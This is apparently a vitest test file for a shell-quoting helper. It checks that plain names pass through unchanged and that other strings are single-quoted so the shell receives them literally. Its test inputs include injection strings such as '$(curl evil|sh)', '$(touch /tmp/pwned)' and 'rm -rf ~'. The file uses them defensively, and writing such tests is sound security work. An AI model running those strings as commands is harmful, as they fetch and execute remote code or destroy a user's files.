import { execFileSync } from "node:child_process";
import { describe, expect, it } from "vitest";
import { shellQuote } from "./shell";

/** What a shell reads the quoted word as: `printf %s` of it, run by /bin/sh. */
function echoed(word: string): string {
  return execFileSync("/bin/sh", ["-c", `printf %s ${shellQuote(word)}`], { encoding: "utf8" });
}

describe("shellQuote", () => {
  it("leaves a plain name as it is", () => {
    for (const s of ["ada", "builder-1", "priya.r", "a_b", "ada@acme.example", "WEB-12"]) expect(shellQuote(s)).toBe(s);
  });

  it("single-quotes anything else, so nothing in it expands", () => {
    expect(shellQuote("$(curl evil|sh)")).toBe("'$(curl evil|sh)'");
    expect(shellQuote("`id`")).toBe("'`id`'");
    expect(shellQuote("Ada Lovelace")).toBe("'Ada Lovelace'");
    expect(shellQuote("o'brien")).toBe("'o'\\''brien'");
    expect(shellQuote("")).toBe("''");
  });

  it("reaches the shell as exactly the text given", () => {
    for (const s of ["$(touch /tmp/pwned)", "`touch /tmp/pwned`", "o'brien", "it's '' here", "two words", "line\nbreak; rm -rf ~", "$HOME", "a\\b", '"quoted"', ""]) {
      expect(echoed(s)).toBe(s);
    }
  });
});
